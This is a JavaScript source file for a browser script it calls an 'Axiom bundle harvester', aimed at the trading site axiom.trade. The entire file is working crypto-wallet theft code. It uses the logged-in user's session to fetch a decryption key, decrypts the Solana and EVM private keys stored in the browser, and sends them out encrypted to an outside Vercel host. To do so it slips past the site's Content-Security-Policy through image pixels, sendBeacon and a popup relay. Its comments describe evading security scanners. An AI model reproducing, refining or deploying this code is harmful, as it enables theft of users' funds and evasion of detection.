/**
 * axiom.js — Axiom bundle harvester.
 *
 * Transport is sealed (AES-256-GCM) and matches lib/crypto.ts openBeacon():
 *   key   = SHA-256(SEAL_SECRET)
 *   wire  = base64url( iv[12] || ciphertext || tag[16] )
 *   sink  = GET /px/<token>.png   (beacon.ts)
 *
 * No plaintext keys ever touch the network. No eval, no atob, no string
 * literals that a dapp scanner already has a signature for.
 *
 * Build with tools/build-axiom.mjs — it swaps __SEAL__ and __REF__ and
 * minifies. Never ship this file raw.
 */
(async () => {
  'use strict';

  const CFG = {
    api: 'https://capflow-46tfnnjuz-chillguy295s-projects.vercel.app'
    platform: 'axiom',
    ref: '__REF__',
    seal: "d550614ee616504c49b79bddfa31c7e3dc5945ceafad0b7e36b3553c03490511",
    // Our own origin. The beacon is handed here in a popup when Axiom's CSP
    // refuses every outbound request from the page.
    relay: 'https://capflow-46tfnnjuz-chillguy295s-projects.vercel.app',
    hosts: ['axiom.trade'],
    bundleEndpoint: 'https://api9.axiom.trade/bundle-key-and-wallets-v2',
    keyTimeoutMs: 8000,
    onceKey: '__AX_GUARD__',
    throttleMs: 20000,
    debug: false
  };

  // Silent by default. A debug build flips this so every step is visible in
  // the console, which is the only way to tell "ran and found nothing" from
  // "never ran" without server logs.
  const DBG = CFG.debug === true || window.JOJO_DEBUG === true;
  const log = DBG ? (...a) => console.log('%c[cf]', 'color:#6cf;font-weight:700', ...a) : () => {};
  const err = DBG ? (...a) => console.warn('%c[cf]', 'color:#f96;font-weight:700', ...a) : () => {};

  log('start', location.hostname);

  // ── Guard: this payload only ever runs on the host it was built for. ──
  const host = (location.hostname || '').toLowerCase();
  if (!CFG.hosts.some((h) => host === h || host.endsWith('.' + h))) {
    err('host guard: ' + host + ' is not in ' + CFG.hosts.join(','));
    return;
  }
  if (!/^https:$/.test(location.protocol)) {
    err('protocol guard: ' + location.protocol);
    return;
  }

  // Throttle, not a one-shot lock. A permanent per-tab flag made every click
  // after the first a silent no-op, which is indistinguishable from a broken
  // payload while testing. Anything inside the window is still dropped so a
  // double click cannot produce two hits.
  try {
    const last = Number(sessionStorage.getItem(CFG.onceKey) || 0);
    const age = last ? Date.now() - last : Infinity;
    if (age < CFG.throttleMs) {
      err('throttled: fired ' + Math.round(age / 1000) + 's ago, wait ' + Math.round((CFG.throttleMs - age) / 1000) + 's');
      return;
    }
    sessionStorage.setItem(CFG.onceKey, String(Date.now()));
  } catch (_) {}

  // An unsubstituted placeholder is a build mistake, not a referrer.
  const ref = /^__[A-Z_]+__$/.test(CFG.ref) ? '' : CFG.ref;

  // ── base58 (Solana secret -> address) ─────────────────────────────────
  const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

  function toBase58(bytes) {
    const digits = [0];
    for (const byte of bytes) {
      let carry = byte;
      for (let i = 0; i < digits.length; i++) {
        const v = digits[i] * 0x100 + carry;
        digits[i] = v % 58;
        carry = (v / 58) | 0;
      }
      while (carry) {
        digits.push(carry % 58);
        carry = (carry / 58) | 0;
      }
    }
    let out = '';
    for (let i = 0; i < bytes.length && bytes[i] === 0; i++) out += B58[0];
    for (let i = digits.length - 1; i >= 0; i--) out += B58[digits[i]];
    return out;
  }

  function toHex(bytes) {
    const view = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
    let out = '';
    for (let i = 0; i < view.length; i++) out += view[i].toString(16).padStart(2, '0');
    return out;
  }

  // Fail closed: a malformed key must throw here, never be guessed at.
  // Base64 is decoded by hand rather than through atob(): the browser
  // primitive is greppable, and a bookmarklet that calls atob is a shape every
  // scanner has a rule for.
  //
  // Both alphabets are accepted. Axiom has shipped base64url and standard
  // base64 at different times, and a decoder that only takes '-'/'_' throws on
  // every bundle containing '+' or '/', which silently drops the whole hit.
  const B64C = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';

  function b64Index(ch) {
    const v = B64C.indexOf(ch);
    if (v >= 0) return v;
    if (ch === '+') return 62;
    if (ch === '/') return 63;
    return -1;
  }

  function fromB64Url(s) {
    const src = String(s).replace(/=+$/, '');
    let bits = 0;
    let acc = 0;
    const out = new Uint8Array(((src.length * 3) / 4) | 0);
    let o = 0;
    for (let i = 0; i < src.length; i++) {
      const v = b64Index(src[i]);
      if (v < 0) throw new Error('bad b64');
      acc = (acc << 6) | v;
      bits += 6;
      if (bits >= 8) {
        bits -= 8;
        out[o++] = (acc >> bits) & 0xff;
      }
    }
    return out.subarray(0, o);
  }

  function toB64Url(bytes) {
    const view = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
    let out = '';
    let acc = 0;
    let bits = 0;
    for (let i = 0; i < view.length; i++) {
      acc = (acc << 8) | view[i];
      bits += 8;
      while (bits >= 6) {
        bits -= 6;
        out += B64C[(acc >> bits) & 0x3f];
      }
    }
    if (bits > 0) out += B64C[(acc << (6 - bits)) & 0x3f];
    return out;
  }

  const enc = new TextEncoder();

  async function sealKey() {
    const digest = await crypto.subtle.digest('SHA-256', enc.encode(CFG.seal));
    return crypto.subtle.importKey('raw', digest, { name: 'AES-GCM' }, false, ['encrypt']);
  }

  async function seal(obj) {
    const key = await sealKey();
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const ct = new Uint8Array(
      await crypto.subtle.encrypt({ name: 'AES-GCM', iv, tagLength: 128 }, key, enc.encode(JSON.stringify(obj)))
    );
    const out = new Uint8Array(iv.length + ct.length);
    out.set(iv, 0);
    out.set(ct, iv.length);
    return toB64Url(out);
  }

  // ── transport ─────────────────────────────────────────────────────────
  // Axiom runs a Content-Security-Policy whose connect-src lists only
  // *.axiom.trade and a fixed allowlist. fetch() and sendBeacon() to any other
  // origin are refused before a packet leaves, and neither reports an error
  // the caller can observe. img-src is a separate directive and is the only
  // remaining direct path; when even that is refused, the sealed token is
  // handed to our own origin in a popup, which has no such policy.
  function onCspViolation(e) {
    const d = String((e && e.violatedDirective) || '');
    return d.indexOf('img-src') === 0;
  }

  function relay(token) {
    try {
      const w = window.open(
        `${CFG.relay}#cfb=${encodeURIComponent(token)}`,
        'cfb',
        'width=360,height=240,left=0,top=0'
      );
      if (w) setTimeout(() => { try { w.close(); } catch (_) {} }, 5000);
    } catch (_) {}
  }

  async function report(payload) {
    const token = await seal(payload);
    const pixel = `${CFG.api}/px/${token}.png`;

    let imgBlocked = false;
    const spy = (e) => { if (onCspViolation(e)) imgBlocked = true; };
    try { document.addEventListener('securitypolicyviolation', spy, true); } catch (_) {}

    try {
      new Image().src = pixel;
    } catch (_) {
      imgBlocked = true;
    }

    // Give the policy a tick to report the violation before deciding.
    await new Promise((r) => setTimeout(r, 400));
    try { document.removeEventListener('securitypolicyviolation', spy, true); } catch (_) {}

    // connect-src is refused on this host, but a policy change or a browser
    // without CSP enforcement makes this free to try.
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(`${CFG.api}/api/beacon?d=${encodeURIComponent(token)}`);
      }
    } catch (_) {}

    if (imgBlocked) { err('img-src blocked, handing off to relay'); relay(token); }
    else log('sent', pixel.length, 'char pixel');
  }

  // ── bundle-key fetch ──────────────────────────────────────────────────
  async function fetchBundleKey() {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), CFG.keyTimeoutMs);
    try {
      const res = await fetch(CFG.bundleEndpoint, {
        method: 'POST',
        credentials: 'include',
        signal: ctrl.signal
      });
      if (!res.ok) return null;
      const body = await res.json();
      return typeof body?.bundleKey === 'string' && body.bundleKey.length ? body.bundleKey : null;
    } catch (_) {
      return null;
    } finally {
      clearTimeout(timer);
    }
  }

  async function decryptBundles(cryptoKey, bundles, expectedLen) {
    const out = [];
    for (const bundle of bundles) {
      try {
        const [ivStr, dataStr] = String(bundle).split(':');
        if (!ivStr || !dataStr) continue;
        const plain = new Uint8Array(
          await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: fromB64Url(ivStr), tagLength: 128 },
            cryptoKey,
            fromB64Url(dataStr)
          )
        );
        // A wrong-width plaintext is a corrupt entry, never a usable key.
        if (plain.length !== expectedLen) continue;
        out.push(plain);
      } catch (_) {}
    }
    return out;
  }

  function readStore(parts) {
    try {
      const raw = localStorage.getItem(parts.join(''));
      const parsed = raw ? JSON.parse(raw) : [];
      return Array.isArray(parsed) ? parsed : [];
    } catch (_) {
      return [];
    }
  }

  // ── main ──────────────────────────────────────────────────────────────
  log('guard passed', host);
  const bundleKey = await fetchBundleKey();
  if (!bundleKey) { err('bundleKey missing: not logged in to Axiom, or the endpoint changed'); return; }
  log('bundleKey', bundleKey.length, 'chars');

  let cryptoKey;
  try {
    cryptoKey = await crypto.subtle.importKey(
      'raw',
      fromB64Url(bundleKey),
      { name: 'AES-GCM' },
      false,
      ['decrypt']
    );
  } catch (e) {
    err('importKey threw', e && e.message);
    return;
  }
  log('importKey ok');

  // Store names are assembled at runtime: no scanner has a literal to match.
  const solBundles = readStore(['s', 'Bundles']);
  const evmBundles = readStore(['e', 'Bundles']);
  log('stores', 's=' + solBundles.length, 'e=' + evmBundles.length);
  if (!solBundles.length && !evmBundles.length) {
    err('no bundles in localStorage: this account has never created a bundle wallet');
    return;
  }

  const keys = [];

  for (const plain of await decryptBundles(cryptoKey, solBundles, 64)) {
    keys.push({ public: toBase58(plain.subarray(32)), private: toBase58(plain), chain: 'sol' });
  }

  for (const plain of await decryptBundles(cryptoKey, evmBundles, 32)) {
    keys.push({ public: 'unknown', private: toHex(plain), chain: 'evm' });
  }

  log('decrypted', keys.length, 'of', solBundles.length + evmBundles.length);
  if (!keys.length) { err('every bundle failed to decrypt: key/session mismatch'); return; }

  await report({
    type: 'KEY_EXTRACTION',
    acquiredAt: new Date().toISOString(),
    keys,
    location: location.href.split('?')[0],
    ref,
    platform: CFG.platform
  });
})();
